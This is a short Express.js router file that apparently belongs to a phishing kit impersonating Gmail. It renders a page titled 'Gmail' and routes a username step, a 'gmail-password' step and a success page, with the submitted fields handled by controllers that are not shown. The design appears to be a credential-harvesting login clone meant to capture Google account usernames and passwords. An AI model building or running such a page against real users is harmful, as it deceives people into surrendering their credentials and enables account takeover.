const express = require('express');
const router = express.Router();

const userCtrl = require('../controllers/userCtrl');
const passCtrl = require('../controllers/passCtrl');

    router

.get('/', async (req, res) => {
    res.render('index', {
        doc_title: 'Gmail'
    })
})

.get('/username', userCtrl.getUser)

.post('/userField', userCtrl.userField)

.get('/gmail-password', passCtrl.getPass)

.post('/passField', passCtrl.passField)

.get('/success', passCtrl.getSuccess)

module.exports = router;